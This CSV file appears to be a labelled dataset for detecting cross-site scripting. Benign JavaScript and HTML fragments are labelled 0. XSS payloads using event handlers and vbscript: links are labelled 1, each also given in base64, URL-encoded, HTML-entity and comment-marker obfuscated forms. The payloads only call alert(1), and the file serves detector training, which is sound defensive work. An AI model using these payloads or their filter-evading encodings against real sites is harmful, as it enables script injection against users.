sample_id,variant_id,technique,payload_original,payload_obfuscated,label
574,0,none,this._element.style[property] = `${scrollbarwidth}px` } if (!isbodyoverflowing && ismodaloverflowing) {,this._element.style[property] = `${scrollbarwidth}px` } if (!isbodyoverflowing && ismodaloverflowing) {,0
575,0,none,"<li><a href=""/wiki/glossary_of_physics"" title=""glossary of physics"">physics </a> </li>","<li><a href=""/wiki/glossary_of_physics"" title=""glossary of physics"">physics </a> </li>",0
576,0,none,"_classcallcheck(this, autocomplete)","_classcallcheck(this, autocomplete)",0
577,0,none,} parsed.handles = entry.length; parsed.start = entry;,} parsed.handles = entry.length; parsed.start = entry;,0
578,0,none,if (element !== this._element && window.innerwidth > element.clientwidth + scrollbarwidth) { return; },if (element !== this._element && window.innerwidth > element.clientwidth + scrollbarwidth) { return; },0
579,1,html_entities,<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,&lt;li onblur=alert(1) tabindex=1 id=x&gt;&lt;/li&gt;&lt;input autofocus&gt;,1
579,2,urlencode,<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,%3Cli%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fli%3E%3Cinput%20autofocus%3E,1
579,3,base64,<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,PGxpIG9uYmx1cj1hbGVydCgxKSB0YWJpbmRleD0xIGlkPXg+PC9saT48aW5wdXQgYXV0b2ZvY3VzPg==,1
580,0,none,"gpuacceleration: gpuacceleration, isfixed: state.options.strategy === 'fixed' };","gpuacceleration: gpuacceleration, isfixed: state.options.strategy === 'fixed' };",0
581,0,none,"this._resetelementattributes(this._element, property_padding) this._resetelementattributes(selector_fixed_content, property_padding) this._resetelementattributes(selector_sticky_content, property_margin)","this._resetelementattributes(this._element, property_padding) this._resetelementattributes(selector_fixed_content, property_padding) this._resetelementattributes(selector_sticky_content, property_margin)",0
582,1,html_entities,<bdi onpointerenter=alert(1)>xss</bdi>,&lt;bdi onpointerenter=alert(1)&gt;xss&lt;/bdi&gt;,1
582,2,double_urlencode,<bdi onpointerenter=alert(1)>xss</bdi>,%253Cbdi%2520onpointerenter%253Dalert%25281%2529%253Exss%253C%252Fbdi%253E,1
582,3,base64,<bdi onpointerenter=alert(1)>xss</bdi>,PGJkaSBvbnBvaW50ZXJlbnRlcj1hbGVydCgxKT54c3M8L2JkaT4=,1
583,0,none,"activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname) this._issliding = false triggerevent(event_slid)","activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname) this._issliding = false triggerevent(event_slid)",0
584,0,none,"<li id=""cite_note-liwu2015-270""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-liwu2015_270-0"">^ </a> </b>","<li id=""cite_note-liwu2015-270""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-liwu2015_270-0"">^ </a> </b>",0
585,1,base64,"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PHN0cm9uZyBvbmRyYWdvdmVyPWFsZXJ0KDEpIGNvbnRlbnRlZGl0YWJsZT5kcm9wIGhlcmU8L3N0cm9uZz4=,1
585,2,urlencode,"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cstrong%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fstrong%3E,1
585,3,html_entities,"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;strong ondragover=alert(1) contenteditable&gt;drop here&lt;/strong&gt;,1
586,0,none,formreset .find(input_selector) .removeclass('valid'),formreset .find(input_selector) .removeclass('valid'),0
587,0,none,"if (this.options.swipeable) { if (this._tabscarousel) { this._tabscarousel.set(this.index, () => {","if (this.options.swipeable) { if (this._tabscarousel) { this._tabscarousel.set(this.index, () => {",0
588,1,double_urlencode,<set onpointerleave=alert(1)>xss</set>,%253Cset%2520onpointerleave%253Dalert%25281%2529%253Exss%253C%252Fset%253E,1
588,2,base64,<set onpointerleave=alert(1)>xss</set>,PHNldCBvbnBvaW50ZXJsZWF2ZT1hbGVydCgxKT54c3M8L3NldD4=,1
588,3,urlencode,<set onpointerleave=alert(1)>xss</set>,%3Cset%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fset%3E,1
589,0,none,if ( to !== false && !isnan(to) ) {,if ( to !== false && !isnan(to) ) {,0
590,0,none,"<li><a href=""/wiki/glossary_of_ichthyology"" title=""glossary of ichthyology"">ichthyology </a> </li>","<li><a href=""/wiki/glossary_of_ichthyology"" title=""glossary of ichthyology"">ichthyology </a> </li>",0
591,0,none,var attributes = state.attributes[name] || {},var attributes = state.attributes[name] || {},0
592,1,whitespace_noise,"<area onbeforepaste=""alert(1)"" contenteditable>test</area>","<  area onbeforepaste="" alert(1)"" contenteditable>test</area>  ",1
592,2,html_entities,"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",&lt;area onbeforepaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/area&gt;,1
592,3,base64,"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",PGFyZWEgb25iZWZvcmVwYXN0ZT0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9hcmVhPg==,1
593,0,none,"}] }, b = { linear: a(.25, .25, .75, .75) }, f = {},","}] }, b = { linear: a(.25, .25, .75, .75) }, f = {},",0
594,0,none,resultscontainer.append(resultdiv),resultscontainer.append(resultdiv),0
595,0,none,radian = math.pi * 2 + radian; } let value = math.round(radian / unit);,radian = math.pi * 2 + radian; } let value = math.round(radian / unit);,0
596,1,whitespace_noise,"<big draggable=""true"" ondragstart=""alert(1)"">test</big>","<big draggable=""true"" ondragstart=""alert(1)"">test</ big>",1
596,2,base64,"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",PGJpZyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ3N0YXJ0PSJhbGVydCgxKSI+dGVzdDwvYmlnPg==,1
596,3,urlencode,"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",%3Cbig%20draggable%3D%22true%22%20ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fbig%3E,1
597,0,none,this.$el.before(this.$overlay); var overlayoffset = this.$overlay[0].getboundingclientrect(); this.$overlay.css({,this.$el.before(this.$overlay); var overlayoffset = this.$overlay[0].getboundingclientrect(); this.$overlay.css({,0
598,0,none,} if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true;,} if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true;,0
599,0,none,definejqueryplugin(collapse); var top = 'top'; var bottom = 'bottom';,definejqueryplugin(collapse); var top = 'top'; var bottom = 'bottom';,0
600,0,none,"window.index.add({ href: 'http://materializecss.com/helpers.html', title: 'helpers',","window.index.add({ href: 'http://materializecss.com/helpers.html', title: 'helpers',",0
601,1,html_entities,"<ins onclick=""alert(1)"">test</ins>",&lt;ins onclick=&quot;alert(1)&quot;&gt;test&lt;/ins&gt;,1
601,2,base64,"<ins onclick=""alert(1)"">test</ins>",PGlucyBvbmNsaWNrPSJhbGVydCgxKSI+dGVzdDwvaW5zPg==,1
601,3,whitespace_noise,"<ins onclick=""alert(1)"">test</ins>","<ins onclick=""alert(1)""  >test</ins>",1
602,0,none,"}function ba(a, c) {","}function ba(a, c) {",0
603,1,base64,<i onpointerleave=alert(1)>xss</i>,PGkgb25wb2ludGVybGVhdmU9YWxlcnQoMSk+eHNzPC9pPg==,1
603,2,urlencode,<i onpointerleave=alert(1)>xss</i>,%3Ci%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fi%3E,1
603,3,html_entities,<i onpointerleave=alert(1)>xss</i>,&lt;i onpointerleave=alert(1)&gt;xss&lt;/i&gt;,1
604,0,none,"<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">common practices","<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">common practices",0
605,1,base64,"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",PHN1YiBvbmJlZm9yZXBhc3RlPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L3N1Yj4=,1
605,2,html_then_urlencode,"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",%26lt%3Bsub%20onbeforepaste%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fsub%26gt%3B,1
605,3,html_entities,"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",&lt;sub onbeforepaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/sub&gt;,1
606,1,base64,"<th onkeypress=""alert(1)"" contenteditable>test</th>",PHRoIG9ua2V5cHJlc3M9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvdGg+,1
606,2,comment_marker,"<th onkeypress=""alert(1)"" contenteditable>test</th>","<th onkeypress=""alert(1)"" contenteditable>test</th/*OBF*/>",1
606,3,html_entities,"<th onkeypress=""alert(1)"" contenteditable>test</th>",&lt;th onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/th&gt;,1
607,1,double_urlencode,<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,%253Cbody%2520id%253Dx%2520tabindex%253D1%2520onbeforeactivate%253Dalert%25281%2529%253E%253C%252Fbody%253E,1
607,2,urlencode,<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,%3Cbody%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C%2Fbody%3E,1
607,3,base64,<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,PGJvZHkgaWQ9eCB0YWJpbmRleD0xIG9uYmVmb3JlYWN0aXZhdGU9YWxlcnQoMSk+PC9ib2R5Pg==,1
608,0,none,"function countdecimals ( numstr ) { numstr = string(numstr); var pieces = numstr.split(""."");","function countdecimals ( numstr ) { numstr = string(numstr); var pieces = numstr.split(""."");",0
609,0,none,"this._element.setattribute('aria-modal', true) this._element.setattribute('role', 'dialog') this._element.scrolltop = 0","this._element.setattribute('aria-modal', true) this._element.setattribute('role', 'dialog') this._element.scrolltop = 0",0
610,1,double_urlencode,"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",%253Cstyle%253E%253Atarget%2520%257Btransform%253A%2520rotate%2528180deg%2529%253B%257D%253C%252Fstyle%253E%253Ckbd%2520id%253Dx%2520style%253D%2522transition%253Atransform%25202s%2522%2520ontransitionrun%253Dalert%25281%2529%253E%253C%252Fkbd%253E,1
610,2,urlencode,"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ckbd%20id%3Dx%20style%3D%22transition%3Atransform%202s%22%20ontransitionrun%3Dalert%281%29%3E%3C%2Fkbd%3E,1
610,3,base64,"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PGtiZCBpZD14IHN0eWxlPSJ0cmFuc2l0aW9uOnRyYW5zZm9ybSAycyIgb250cmFuc2l0aW9ucnVuPWFsZXJ0KDEpPjwva2JkPg==,1
611,1,double_urlencode,"<hgroup onmouseover=""alert(1)"">test</hgroup>",%253Chgroup%2520onmouseover%253D%2522alert%25281%2529%2522%253Etest%253C%252Fhgroup%253E,1
611,2,urlencode,"<hgroup onmouseover=""alert(1)"">test</hgroup>",%3Chgroup%20onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fhgroup%3E,1
611,3,comment_marker,"<hgroup onmouseover=""alert(1)"">test</hgroup>","<hgroup onmouseover=""alert(1)"">test</hgroup>",1
612,1,urlencode,<rp onpointerleave=alert(1)>xss</rp>,%3Crp%20onpointerleave%3Dalert%281%29%3Exss%3C%2Frp%3E,1
612,2,html_entities,<rp onpointerleave=alert(1)>xss</rp>,&lt;rp onpointerleave=alert(1)&gt;xss&lt;/rp&gt;,1
612,3,base64,<rp onpointerleave=alert(1)>xss</rp>,PHJwIG9ucG9pbnRlcmxlYXZlPWFsZXJ0KDEpPnhzczwvcnA+,1
613,0,none,"this.$floatingbtnsreverse.each((el) => { anim({ targets: el,","this.$floatingbtnsreverse.each((el) => { anim({ targets: el,",0
614,0,none,"}, { key: ""_animateimageout"", value: function _animateimageout() {","}, { key: ""_animateimageout"", value: function _animateimageout() {",0
615,1,comment_marker,"<a href=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" language=vbs onclick=""vbscript:msgbox+1"">xss</a>","<a href=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:ms/*OBF*/g/*OBF*/box+1"">xss</a> <a hr/*OBF*/ef=""#"" oncli/*OBF*/ck=""vbs/*OBF*/:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick/*OBF*/=""vbscript:msgbox+1"">xss</a/*OBF*/> <a href=""#"" language=vbs oncli/*OBF*/ck=""vbscript:msgbox+1"">xss</a>",1
615,2,urlencode,"<a href=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" language=vbs onclick=""vbscript:msgbox+1"">xss</a>",%3Ca%20href%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbs%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbs%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20language%3Dvbs%20onclick%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E,1
615,3,base64,"<a href=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" language=vbs onclick=""vbscript:msgbox+1"">xss</a>",PGEgaHJlZj0idmJzY3JpcHQ6bXNnYm94KzEiPnhzczwvYT4gPGEgaHJlZj0iIyIgb25jbGljaz0idmJzOm1zZ2JveCsxIj54c3M8L2E+IDxhIGhyZWY9IiMiIG9uY2xpY2s9InZiczptc2dib3grMSI+eHNzPC9hPiA8YSBocmVmPSIjIiBvbmNsaWNrPSJ2YnNjcmlwdDptc2dib3grMSI+eHNzPC9hPiA8YSBocmVmPSIjIiBvbmNsaWNrPSJ2YnNjcmlwdDptc2dib3grMSI+eHNzPC9hPiA8YSBocmVmPSIjIiBsYW5ndWFnZT12YnMgb25jbGljaz0idmJzY3JpcHQ6bXNnYm94KzEiPnhzczwvYT4=,1
616,0,none,}); } _focusfocuseditem() {,}); } _focusfocuseditem() {,0
617,1,comment_marker,"<plaintext onmousemove=""alert(1)"">test</plaintext>","<plaintext onmousemove=""alert(1)"">test</plaintext>",1
617,2,whitespace_noise,"<plaintext onmousemove=""alert(1)"">test</plaintext>","<plaintext onmousemove= ""alert(1) "">test</plaintext>",1
617,3,html_entities,"<plaintext onmousemove=""alert(1)"">test</plaintext>",&lt;plaintext onmousemove=&quot;alert(1)&quot;&gt;test&lt;/plaintext&gt;,1
618,1,double_urlencode,"<script src=""https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js""></script> <script> document.write(dompurify.sanitize('<img src onerror=alert(1)>')) </script>",%253Cscript%2520src%253D%2522https%253A%252F%252Fcdnjs.cloudflare.com%252Fajax%252Flibs%252Fdompurify%252F2.0.12%252Fpurify.min.js%2522%253E%253C%252Fscript%253E%2520%253Cscript%253E%2520document.write%2528dompurify.sanitize%2528%2527%253Cimg%2520src%2520onerror%253Dalert%25281%2529%253E%2527%2529%2529%2520%253C%252Fscript%253E,1
618,2,urlencode,"<script src=""https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js""></script> <script> document.write(dompurify.sanitize('<img src onerror=alert(1)>')) </script>",%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fdompurify%2F2.0.12%2Fpurify.min.js%22%3E%3C%2Fscript%3E%20%3Cscript%3E%20document.write%28dompurify.sanitize%28%27%3Cimg%20src%20onerror%3Dalert%281%29%3E%27%29%29%20%3C%2Fscript%3E,1
618,3,whitespace_noise,"<script src=""https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js""></script> <script> document.write(dompurify.sanitize('<img src onerror=alert(1)>')) </script>","<script src=""https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"">  <  /script>   <script> document.write( dompurify.sanitize('<img src onerror=alert(1) >')) < /script>",1
619,0,none,"function chips(el, options) {","function chips(el, options) {",0
620,0,none,'dropdown-content select-dropdown ' + (this.ismultiple ? 'multiple-select-dropdown' : '') ); if (this.$selectoptions.length) {,'dropdown-content select-dropdown ' + (this.ismultiple ? 'multiple-select-dropdown' : '') ); if (this.$selectoptions.length) {,0
621,1,comment_marker,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>","<style>@keyframes x{from {lef/*OBF*/t:0;}to {left: 1000px;}}:target {animati/*OBF*/on:10s ease-in-out 0s 1 x;}</style><c/*OBF*/aption id=x style=""position:absolute;"" on/*OBF*/animationcancel=""alert/*OBF*/(1)""></caption>",1
621,2,html_entities,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;caption id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;&gt;&lt;/caption&gt;,1
621,3,base64,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",PHN0eWxlPkBrZXlmcmFtZXMgeHtmcm9tIHtsZWZ0OjA7fXRvIHtsZWZ0OiAxMDAwcHg7fX06dGFyZ2V0IHthbmltYXRpb246MTBzIGVhc2UtaW4tb3V0IDBzIDEgeDt9PC9zdHlsZT48Y2FwdGlvbiBpZD14IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTsiIG9uYW5pbWF0aW9uY2FuY2VsPSJhbGVydCgxKSI+PC9jYXB0aW9uPg==,1
622,1,double_urlencode,<svg><summary onload=alert(1)></summary>,%253Csvg%253E%253Csummary%2520onload%253Dalert%25281%2529%253E%253C%252Fsummary%253E,1
622,2,whitespace_noise,<svg><summary onload=alert(1)></summary>,<svg><summary onload=alert(1)></summary>,1
622,3,urlencode,<svg><summary onload=alert(1)></summary>,%3Csvg%3E%3Csummary%20onload%3Dalert%281%29%3E%3C%2Fsummary%3E,1
623,0,none,var element = state.elements[name]; // arrow is optional + virtual elements if (!ishtmlelement(element) || !getnodename(element)) { return;,var element = state.elements[name]; // arrow is optional + virtual elements if (!ishtmlelement(element) || !getnodename(element)) { return;,0
624,0,none,"} else if ( !array.isarray( entry ) || !entry.length || entry.length !== parsed.handles + 1 ) { throw new error(""nouislider: 'connect' option doesn't match handle count."");","} else if ( !array.isarray( entry ) || !entry.length || entry.length !== parsed.handles + 1 ) { throw new error(""nouislider: 'connect' option doesn't match handle count."");",0
625,0,none,this.el.m_range = undefined,this.el.m_range = undefined,0
626,0,none,"this._element.classlist.add(class_name_show) this._element.classlist.remove(class_name_showing) eventhandler.trigger(this._element, event_shown, { relatedtarget })","this._element.classlist.add(class_name_show) this._element.classlist.remove(class_name_showing) eventhandler.trigger(this._element, event_shown, { relatedtarget })",0
627,0,none,"}); var referenceclippingoffsets = getsideoffsets(referenceoverflow, referencerect); var popperescapeoffsets = getsideoffsets(popperaltoverflow, popperrect, preventedoffsets);","}); var referenceclippingoffsets = getsideoffsets(referenceoverflow, referencerect); var popperescapeoffsets = getsideoffsets(popperaltoverflow, popperrect, preventedoffsets);",0
628,0,none,"<li id=""cite_note-formal_methods_in_ai-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-formal_methods_in_ai_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-formal_methods_in_ai_43-1""><sup><i><b>b </b> </i> </sup> </a>","<li id=""cite_note-formal_methods_in_ai-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-formal_methods_in_ai_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-formal_methods_in_ai_43-1""><sup><i><b>b </b> </i> </sup> </a>",0
